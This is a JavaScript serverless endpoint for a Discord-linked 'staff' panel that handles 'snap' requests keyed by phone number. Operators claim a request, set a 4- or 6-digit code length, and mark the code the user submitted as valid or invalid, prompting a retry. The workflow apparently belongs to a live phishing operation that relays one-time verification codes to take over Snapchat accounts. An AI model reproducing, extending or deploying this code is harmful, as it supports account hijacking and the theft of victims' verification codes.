/**
 * api/staff-action.js — Staff action endpoint  (v2.2)
 *
 * v2.2: claim now persists discord_user_id in claimed_by_discord_id column
 *       so the bot can enforce claimer-only buttons even after a restart.
 *       unclaim clears claimed_by_discord_id.
 *
 * v2.1: claim uses WHERE status='pending' RETURNING id (atomic, prevents double-claim).
 *       unclaim is now logged in snap_logs.
 */

import { neon }         from "@neondatabase/serverless";
import { checkBannedIP } from "./middleware.js";

export default async function handler(req, res) {
    res.setHeader("Access-Control-Allow-Origin", "*");
    if (req.method === "OPTIONS") { res.status(200).end(); return; }
    if (req.method !== "POST")   return res.status(405).json({ success: false });

    try {
        const blocked = await checkBannedIP(req, res);
        if (blocked) return blocked;

        const { action, phone, length, secret, staff_tag, discord_user_id } = req.body;

        if (secret !== process.env.STAFF_SECRET) {
            return res.status(401).json({ success: false, message: "Unauthorized" });
        }

        const sql = neon(process.env.DATABASE_URL);

        // ─── CLAIM ────────────────────────────────────────────────────────────
        if (action === "claim") {
            // Atomic: only succeeds if still pending → prevents race condition
            const result = await sql`
                UPDATE snap_requests
                SET    status = 'processing',
                       claimed_by_discord_id = ${discord_user_id ?? null}
                WHERE  phone  = ${phone}
                AND    status = 'pending'
                RETURNING id
            `;

            if (result.length === 0) {
                return res.status(409).json({
                    success: false,
                    message: "Cette demande est déjà claim ou introuvable.",
                });
            }

            try {
                await sql`
                    INSERT INTO snap_logs (action, details)
                    VALUES ('claim', ${JSON.stringify({ phone, staff_tag, discord_user_id })})
                `;
            } catch {}

            return res.status(200).json({ success: true, message: "Demande claim" });
        }

        // ─── SET LENGTH ───────────────────────────────────────────────────────
        if (action === "set_length") {
            const len = Number(length);
            if (![4, 6].includes(len)) {
                return res.status(400).json({
                    success: false,
                    message: "Longueur invalide — doit être 4 ou 6",
                });
            }
            await sql`
                UPDATE snap_requests
                SET status = 'waiting_code', code_length = ${len}
                WHERE phone = ${phone}
            `;
            return res.status(200).json({ success: true, message: `Longueur définie : ${len} chiffres` });
        }

        // ─── WRONG NUMBER ─────────────────────────────────────────────────────
        if (action === "wrong_number") {
            await sql`
                UPDATE snap_requests
                SET status = 'wrong_number', claimed_by_discord_id = NULL
                WHERE phone = ${phone}
            `;
            try {
                await sql`
                    INSERT INTO snap_logs (action, details)
                    VALUES ('wrong_number', ${JSON.stringify({ phone, staff_tag })})
                `;
            } catch {}
            return res.status(200).json({ success: true, message: "Mauvais numéro signalé" });
        }

        // ─── TRUE CODE ────────────────────────────────────────────────────────
        if (action === "true_code") {
            await sql`
                UPDATE snap_requests
                SET status = 'completed', claimed_by_discord_id = NULL
                WHERE phone = ${phone}
            `;
            try {
                await sql`
                    INSERT INTO snap_logs (action, details)
                    VALUES ('true_code', ${JSON.stringify({ phone, staff_tag })})
                `;
            } catch {}
            return res.status(200).json({ success: true, message: "Code validé" });
        }

        // ─── FALSE CODE ───────────────────────────────────────────────────────
        if (action === "false_code") {
            // Keep claimed_by_discord_id — same staff member handles the retry
            await sql`
                UPDATE snap_requests
                SET status = 'retry_code'
                WHERE phone = ${phone}
            `;
            try {
                await sql`
                    INSERT INTO snap_logs (action, details)
                    VALUES ('false_code', ${JSON.stringify({ phone, staff_tag })})
                `;
            } catch {}
            return res.status(200).json({ success: true, message: "Code refusé, l'utilisateur doit ressaisir" });
        }

        // ─── UNCLAIM ──────────────────────────────────────────────────────────
        if (action === "unclaim") {
            await sql`
                UPDATE snap_requests
                SET status = 'pending', claimed_by_discord_id = NULL
                WHERE phone = ${phone}
            `;
            try {
                await sql`
                    INSERT INTO snap_logs (action, details)
                    VALUES ('unclaim', ${JSON.stringify({ phone, staff_tag })})
                `;
            } catch {}
            return res.status(200).json({ success: true, message: "Demande unclaimée et remise dans la file" });
        }

        return res.status(400).json({ success: false, message: "Action inconnue" });
    } catch (e) {
        console.error("staff-action error:", e);
        return res.status(500).json({ success: false, message: e.message });
    }
}
